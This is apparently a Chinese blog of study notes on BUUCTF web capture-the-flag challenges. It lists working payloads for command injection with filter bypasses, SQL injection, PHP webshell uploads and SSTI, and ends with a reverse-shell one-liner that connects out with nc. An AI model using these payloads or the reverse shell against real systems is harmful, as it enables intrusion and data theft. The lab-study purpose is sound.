+++
date = '2026-07-30T09:30:00+08:00'
draft = false
title = 'BUUWP 刷题笔记'
tags = ['CTF', 'BUUWP', 'Web']
categories = ['CTF']
description = 'BUUWP Web 方向刷题记录和 payload 笔记。'
+++
2018 warmup

file参数必须伪source.php 和 hint.php
代码审计
后端会把用户传进来的文件名如果代了参数？a= 就把?后面的部分切掉
在和白名单笔记 但是include中执行的是原始的$_REQUEST['file']
所以payload file=hint.php?../../../../../../ffffllllaaaggg
执行include 因为当前执行环境在一个较深的目录里 用多层../回到根目录再打开flag文件


2019 GXVCTF ping
?ip=127.0.0.1 | ls 回显成功
但是 ...|cat flag.php时显示不让有空格
解决方法：
1 {cat,flag.php}shell在执行前会自动把它展开成带空格的标准形式

2 cat${IFS}flag.php IFS在linux中是一个环境变量 系统默认为空格 制表符和换行符

3 cat$IFS$9flag.php shell脚本中$1-$9表示第一到第九个参数 大部分环境中无第九个参数所以为空 用$9隔开IFS和flag.php

4 `cat<flag.php` 把右边喂给左边

5 `cat<>flag.php` 和4类似

6 kg=$'\x20flag.php'&&cat\$kg
ascii中空格就是20 $'\x20flag.php'在shell看来即  flag.php作为kg &&再连上命令cat flag.php

当题目不给输入flag
变量拼接
?.....;a=g;cat\$IFS\$9fla\$ag.php

内联执行
；cat\$IFS\$9\`ls\` (是反引号)
反引号拥有最高优先级 把执行结果放在原来的位置

base64编码

先把cat flag.php编码为base64 Y2...==
;echo\$IFS\$9Y2...\=\=\$IFS\$9|\$IFS\$9base64\$IFS\$9-d\$IFS\$9|\$IFS\$9sh

把密码喊出 | base64 -d 交给base64解密 | sh 交给shell

随便注
表名替换法
查询到有俩个字段 用联合查询被过滤了
用堆叠注入
1‘；show databases:# 爆库
再爆表 两个表 words 和199...
1’；show columns from \`199...\`;#
表名为数字时要用反引号包裹
发现表中有flag 

因为select被过滤了 所以没法select from

rename table words to word1; 把原来的words改为word1 腾出位置

rename table \`199...\` to words; 狸猫上位

alter table words add id int unsigned not Null auto_increment primary key;
给现在这个words加一个id列 auto_increment 自动编号 这样数据库就会给这一行标上id=1

alter table words change flag data varchar(100) 把falg列改为data 这样测地篡改了数据库街工 当正常输入1的时候 后台执行select * from words where id  = '1' 把data(其实是flag)输出

极客2019 upload：
php被拦截
改后缀名phtml
上传后要求要image
加上图片文件头
GIF89a
后端会匹配php
写 `&lt;script language="php"&gt;eval($_POST['a']);&lt;/script&gt;`
上传后bp拦截把Content/type 改为 image/jpeg!!

上传文件若前端强制要求jpg先按要求发 在bp改后缀即可



私有属性在打包时要加上\0 在url输入要输入%00
如
s:14:%22(")%00Name(类名)%00username(属性名)%22


2019 easy calc
源码里有两道防线 WAF 注释中写了不给传防火墙
calc.php内有黑名单 最后用eval('echo',&str,';')
来执行我们输入的数学算式 str由get的num决定

waf禁止num携带字母 但是在num前加空格可以放行
但由于php的字符串解析特性 php在解析的时候又会自动把空格去掉

payload：
？ num=1;(拼接前面的echo)var_dump(scandir(chr(47)))
过滤掉了/ 所以用ascii编码
**var_dump()** 函数用于输出变量的相关信息。
scandir返回制定目录的文件

发现falg文件
? num=1;var_dump(file_get_contents(chr(47).chr(102)....))
file_get_contents中是文件名字acsii编码的拼接

若不在num前加空格 可以在bp抓包 写两次Content Length:0 waf看懵了后端的php仍检查放行



2018 admin
网页源码是一个flask项目
在flask项目中路由文件 通常叫routes.py 或者app.py 记录了所有网址的路径如/login 以及题目的处理函数

故查看routes.py
发现strlower()把用户名变小写
调用了一个生僻的库 bug:给一个unicode字符^A处理一次会变成大写A再处理一次才会变成小写a
用^A dmin注册调用一次函数 创建了Admin账号 在修改Admin密码时又调用了一次
就相当与修改admin的密码 之后就可以登录了

easy MD5
前置知识
md5(string,true/false)
true->原始16字符二进制格式
false->32字符十六进制数

后端select * from 'admin' where password='md5($pass,true)'
payload
ffifdyop ->计算后会变成‘or'6\xc9.....
注入后查询语句为password=’‘or’6....' or后面为真就可以把数据输出了

传你🐎
先传一个.htaccess文件
用来改变文件扩展名
```apache
&lt;FilesMatch "a.png"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
```
上传抓包修改content-type为image/png

再上传一句话木马a,png 也一样抓包修改类型再用蚁剑连接

easy_tornado
要求传入md5(cookie.secret+md(filename))
filename已知 要找cookie.secret
render是python中一个渲染函数 通过调用的函数不同生成不同的页面 如果用户对 render内容可控不仅可以注入xss代码还可以通过{{}}进行变量传递和执行简单的表达式

当只传文件名不传md5时会进入error页面 发现有个参数?msg=error 说明输入msg会输入不同的页面 输入{{handler.setting}->tornado(一个web框架)储存变量的地方

Nizhuan
反序列化+php伪协议
要穿三个参数
首先要传一个内容为...的文件
用到data协议? text=data://text/plain;base64,.....

第二又要include($file) 提示为useless.php
要用php伪协议
?file=php://filter/read=convert.base64-encode/resource=useless.php

最后看useless内容有个flag类还有个tostring魔术方法 在这里就有file_get_contents($this->file)
说明只有传入flag类的一个对象里面的file属性为flag.php即可 写个php脚本输出序列化后的payload

记得分两次传file参数一次用伪协议看useless.php的内容 另外一次直接file=useless.php即可不然看不到flag

hardsql
利用updatexml()执行报错注入
爆库 updatexml(1,concat(0x7e,database()),1)  得出是geek
这道题目and union select 都被过滤了 
mysql中 select(database()) = select database()
\# -> %23 \'->%27
报表把database() 改为select(group_concat(table_name)from(information_schema.tables)where(table_schema)like(%27geek%27)) 这一整个查询语句还得用括号包起来

爆段 select(group_concat(column_name)from(information_schema.columns)where(table_name)like(%27.....%27))
爆数据 select(password)from(....)
因为updatexml只吐32个字符所以只能拿一半
可以利用right函数也可以用substring函数
select(group_concat(right(password,25)))from(..
)

青龙组are u serialz
is_valid()要求传进来的序列化字符串ascii编码必须32-125之间即普通的键盘可见字符
源码定义属性op为protected 当序列化的时候会自动在后面加上一个空字符ascii=0
php7.1以上的额漏洞 反序列化的时候对属性的权限不敏感 故在自己写的脚本protect改为public

checking
文件上传通过配置文件构造php后门 
前置知识：
当在浏览器中访问index.php php会先读取上传的配置文件按上面的指令执行代码
后台使用了exif_imagetype 检测上传文件的真实类型 为绕过需在文件内容加上GIF
构造并上传一个名为.user.ini文件写上
```ini
GIF
auto_prepend_file = a.jpg
```

再上传a.jpg
GIF
`&lt;script language="php"&gt;@eval($_POST['a])&lt;/script&gt;`


auto_prepend_file-> 在执行目标文件如index.php之前自动包含指定文件
auto_append_file ->之后

.htaccess 适用与apache环境


token防爆破
上传用户名和密码时会自动带上上次页面请求放回的token值 token不对就没法登录 这样就可以放爆破
做法：先把token改错->响应token error->发到攻击->攻击类型pitchfork
在用户 密码以及token都加payload->设置->正则提取（勾上每次从响应包提取）->添加 找到token内容选中程序会自动设定规则 ->重定向->每次都跟踪重定向->资源池->新建资源池->线程改为1(只能为1不然token会刷新) 然后token的payload改为"递归提取"->要获取初始payload->刷新页面f12找到token 开始攻击


IKUN
利用脚本找到有lv6的页面
改前端折扣购买
要admin cookie中有jwt 
在kali用jwt crack破解密钥
在jwt在线加密中 把usename改为admin再用新的jwt刷新进入
下载py文件 反序列化漏洞subprocess
抓包改become参数->flag

ip
改xff也没会回显ip
{{1+1}回显2 有ssti服务器模板注入
然后{{system('ls /')}}而非system ls /
这里面应该写后端代码而非操作系统命令

easy_blog
mysql中INTO OUTFILE语法 把查询到的数据不显示而是直接保存成
服务器硬盘上的一个文本文档
SELECT ‘&lt;?php $a=$_GET[1];$a($_GET[2]);?&gt;’
INTO OUTFILE '/var/ww/html/1.php'
免杀木马 ?1=system&2=ls ->system('ls')

建立反弹shell
用蚁剑正向连接失败 只能反向连接
```
?1=system&2=nohup sh -c 'rm /tmp/f;
mkfifo /tmp/f;
cat /tmp/f | /bin/sh -i 2>&1 | nc &lt;your_ip&gt; &lt;your_port&gt; > /tmp/f
' >/dev/null 2>&1 &
```
nohup 忽略挂断
sh -c shell command 把后面的字符串当命令执行
rm 先删
mkfifo 建立管道
cat 读管道里面的东西
| 喂给/bin/sh -i 2>&1(错误信息合并到正确信息)
| nc shell执行后nc 传回电脑
\> 又存入管道命令

必须先在电脑上 nc -lvvp 4444 | nc &lt;ip&gt; &lt;port&gt; (用ipconfig查看)
listening后再执行payload